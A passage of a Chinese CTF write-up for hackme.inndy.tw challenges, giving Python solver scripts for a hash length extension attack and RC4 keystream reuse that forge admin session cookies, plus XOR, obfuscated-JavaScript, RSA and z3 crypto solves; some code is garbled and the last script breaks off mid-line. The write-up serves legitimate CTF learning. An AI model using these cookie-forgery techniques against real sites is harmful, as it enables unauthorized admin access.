现在我们的cookie中，user为
    NmJjYjljOTE1NTk3NWE1M2U5NTFiMGI1MGYxMzc0ODAjbmFtZT1ndWVzdCZhZG1pbj0w
解码
    6bcb9c9155975a53e951b0b50f137480#name=guest&admin=0
如此一来：  
1.我们知道md5(salt.data)的值即sig  
2.我们可以控制data  
3.哈希长度拓展攻击即可  
于是构造脚本
    import hashpumpy
    import base64
    import requests
    url = 'https://hackme.inndy.tw/login2/'
    tmp = hashpumpy.hashpump('6bcb9c9155975a53e951b0b50f137480', 'name=guest&admin=0', 'name=guest&admin=1', 32)
    payload = base64.b64encode(tmp[0]+'#'+tmp[1])
    cookie = {
        'user':payload
    }
    r =requests.get(url=url,cookies=cookie)
    print r.content
运行得到  
即可获得flag
## login as admin 5
我们看到关键代码
    function set_session($user)
    {
        global $cipher;
        $cookie = base64_encode($cipher->encrypt(json_encode($user)));
        setcookie('user5', $cookie, time() + 60 * 60, '/', 'hackme.inndy.tw', true, true);
    }
    function restore_session()
    {
        global $cipher;
        global $user;
        $data = $cipher->decrypt(base64_decode($_COOKIE['user5']));
        $user = json_decode($data, true);
    }
发现加解密都用的rc4，然后明文直接使用了json  
而我们可以知道json，又知道密文，那么可以反推rc4生成的流密钥  
然后利用生成的流密钥，即可伪造消息  
脚本如下
    import base64
    import urllib
    import requests
    c = base64.b64decode('U/osUbnY8nSrWz4WPwKSwWPzKq9tOIQ9eCWnN5E+')
    plain = '{"name":"guest","admin":false}'
    res = ''
    for i in range(len(c)):
        res += chr(ord(c[i])^ord(plain[i]))
    need = '{"name":"guest","admin":true}'
    payload = ''
    for i in range(len(need)):
        payload += chr(ord(need[i])^ord(res[i]))
    payload = urllib.quote(base64.b64encode(payload))
    cookie = {
        'user5':payload
    }
    url = "https://hackme.inndy.tw/login5/"
    r = requests.get(url=url,cookies=cookie)
    print r.content
得到结果  
## xor
运行github开源的xortool脚本
    G:\python2.7\Scripts>python xortool -c 20 xor
    The most probable key lengths:
       1:   8.6%
       3:   10.6%
       6:   9.4%
       9:   21.8%
      12:   7.1%
      15:   6.2%
      18:   14.1%
      27:   9.7%
      36:   7.1%
      45:   5.4%
    Key-length can be 3*n
    1 possible key(s) of length 9:
    hackmepls
    Found 1 plaintexts with 95.0%+ printable characters
    See files filename-key.csv, filename-char_used-perc_printable.csv
得到key：`hackmepls`  
运行脚本解密
    f1 = open("xor","rb")
    key = "hackmepls"
    f3 = open("flagtest.txt","wb")
    # key = f2.read().replace(" ", "")
    # key = "47 6F 6F 64 4C 75 63 6B 54 6F 59 6F 75".replace(" ", "").decode("hex")
    flag = f1.read()
    flag_length = len(flag)
    key_length = len(key)
    flag_res = ""
    for i in range(0,flag_length):
        xor_str = chr(ord(flag[i])^ord(key[i%key_length]))
        flag_res += xor_str
    f3.write(flag_res)
    f3.close()
即可在解密后的明文中找到flag  
得到flag
## emoji
拿到题目后丢进
    https://tool.lu/js/
解密，得到
    console.log((function() {
        if (typeof(require) == 'undefined') return '(´・ω・`)';
        var code = require('process').argv[2];
        if (!code) return '(´・ω・`)';
        String.prototype.zpad = function(l) {
            return this.length  e.charCodeAt(0)).map((e) = > (e * 0xb1 + 0x1b) & 0xff).map((e) = > '\\u' + e.toString(16).zpad(4))).join('') + '"'
        }
        var crypted = ".......";
        if (JSON.parse(encrypt(code)) != crypted) return '(´・ω・`)';
        try {
            eval(code)
        } catch (e) {
            return '(´・ω・`)'
        }
        return '(*´∀`)~♥'
    })())
观察到关键代码
    var crypted = ".......";
        if (JSON.parse(encrypt(code)) != crypted) return '(´・ω・`)';
        try {
            eval(code)
        } catch (e) {
            return '(´・ω・`)'
        }
关键点应该是解密crypted去得到code  
跟到加密函数，发现直接爆破即可，于是写出脚本
    def crack(n):
        for i in range(256):
            if (i * 0xb1 + 0x1b) & 0xff == n:
                return i
    crypted=u'......'
    res = [crack(ord(i)) for i in crypted]
    code = ''
    for j in res:
        code += chr(j)
    print code
得到代码
    $$$=~[];$$$={___:++$$$,$$$$:(![]+"")[$$$],__$:++$$$,$_$_:(![]+"")[$$$],_$_:++$$$,$_$$:({}+"")[$$$],$$_$:($$$[$$$]+"")[$$$],_$$:++$$$,$$$_:(!""+"")[$$$],$__:++$$$,$_$:++$$$,$$__:({}+"")[$$$],$$_:++$$$,$$$:++$$$,$___:++$$$,$__$:++$$$};$$$.$_=($$$.$_=$$$+"")[$$$.$_$]+($$$._$=$$$.$_[$$$.__$])+($$$.$$=($$$.$+"")[$$$.__$])+((!$$$)+"")[$$$._$$]+($$$.__=$$$.$_[$$$.$$_])+($$$.$=(!""+"")[$$$.__$])+($$$._=(!""+"")[$$$._$_])+$$$.$_[$$$.$_$]+$$$.__+$$$._$+$$$.$;$$$.$$=$$$.$+(!""+"")[$$$._$$]+$$$.__+$$$._+$$$.$+$$$.$$;$$$.$=($$$.___)[$$$.$_][$$$.$_];$$$.$($$$.$($$$.$$+"\""+$$$.$$__+$$$._$+"\\"+$$$.__$+$$$.$_$+$$$.$$_+"\\"+$$$.__$+$$$.$$_+$$$._$$+$$$._$+(![]+"")[$$$._$_]+$$$.$$$_+"."+(![]+"")[$$$._$_]+$$$._$+"\\"+$$$.__$+$$$.$__+$$$.$$$+"(\\\"\\"+$$$.__$+$$$.___+$$$.$$_+"\\"+$$$.__$+$$$.__$+$$$.$__+"\\"+$$$.__$+$$$.___+$$$.__$+"\\"+$$$.__$+$$$.___+$$$.$$$+"{\\"+$$$.__$+$$$.__$+$$$._$_+"\\"+$$$.__$+$$$._$_+$$$._$$+"\\"+$$$.$__+$$$.___+"\\"+$$$.__$+$$$.___+$$$.$_$+"\\"+$$$.__$+$$$.$_$+$$$.$$_+$$$.$$__+$$$._$+$$$.$$_$+$$$.$$$_+"\\"+$$$.__$+$$$.$$_+$$$._$_+"\\"+$$$.$__+$$$.___+"\\"+$$$.__$+$$$._$_+$$$._$$+$$$._+$$$.$$__+"\\"+$$$.__$+$$$.$_$+$$$._$$+"\\"+$$$.__$+$$$.$$_+$$$._$$+"}\\\");"+"\"")())();
丢进控制台  
即可得到flag
## multilayer
解题脚本
    import base64
    from Crypto.Util import number
    n=0x80dd2dec6684d43bd8f2115c88717386b2053bdb554a12d52840380af48088b7f1f71c3d3840ef4615af318bbe261d2d2d90616c0d2dcb6414e05c706f2b6d700ed98128048a2b79f57d2c6476add369ec96fb0fed936506d9aee4da5d36aaa97f117b082924c0638923e4367f250cc6cd23918702d98c5359bbb6bad2bef741c65362ad40355fd2edb35248256413d0ee576e7a351f17b9a5a3a7eebbbb2b22f27c342ef6dcaf1396085a105cf5e8b9bbf80e002053347fd9db6e83dc63599b1e1e5a81f7f2e4e2473bc2d14d040c9c6e6f62b9027853c7550a10df49c3a786962c9e9d5b95551a95077d0bd354b88ef31c5625e21edf98f721504f73e1b867
    e=0xcf98d5
    lines = open('encrypted').readlines()
    data = base64.b64decode(lines[3].strip())
    def xor(a, b):
        res=''
        for i in range(len(a)):
            res+=chr(ord(a[i])^ord(b[i]))
        return res
    dec = {}
    for i in range(0x10000):
        x = b'%.4x' % i
        v = number.bytes_to_long(x)
        dec[pow(v, e, n)] = x
    raw = b''
    for i in range(256, len(data), 256):
        prev = data[i-256:i]
        curr = int(xor(prev, data[i:i+256]).encode('hex'), 16)
        raw += dec[curr]
    data = raw.decode('hex')
    r = number.inverse(17, 251)
    for key in range(0,256):
        output=''
        res=''
        for i in data:
            key = (key * 0xc8763 + 9487) % 0x10000000000000000
            output+=chr((ord(i) ^ key) & 0xff)
        for i in output:
            res += chr((ord(i)*r)%251)
        if res[4:5]=='{' and res[-2:] == '}\n':
            print res
            break
详细题解:  
## ffa
解题脚本
    from z3 import *
    from primefac import *
    import libnum
    M=349579051431173103963525574908108980776346966102045838681986112083541754544269
    p=240670121804208978394996710730839069728700956824706945984819015371493837551238
    q=63385828825643452682833619835670889340533854879683013984056508942989973395315
    z=213932962252915797768584248464896200082707350140827098890648372492180142394587
    m=282832747915637398142431587525135167098126503327259369230840635687863475396299
    x=254732859357467931957861825273244795556693016657393159194417526480484204095858
    y=261877836792399836452074575192123520294695871579540257591169122727176542734080
    a, b, c = BitVecs('a b c', 262)
    s = Solver()
    s.add(UGT(a, pow(2, 256, m)))
    s.add(ULT(a, pow(2, 257, m)))
    s.add(UGT(b, pow(2, 256, m)))
    s.add(ULT(b, pow(2, 257, m)))
    s.add(UGT(c, pow(2, 256, m)))
    s.add(ULT(c, pow(2, 257, m)))
    s.add(x == (a + b * 3) % m)
    s.add(y == (b - c * 5) % m)
    s.add(z == (a + c * 8) % m)
    while s.check() == sat:
        A,B= s.model()[a].as_long(),s.model()[b].as_long()
        if gcd(A,B) == 1:
            break
    s1,s2,tmp = libnum.xgcd(A, B)
    if s1
## 后记
欢迎师傅们讨论，菜鸡献丑了！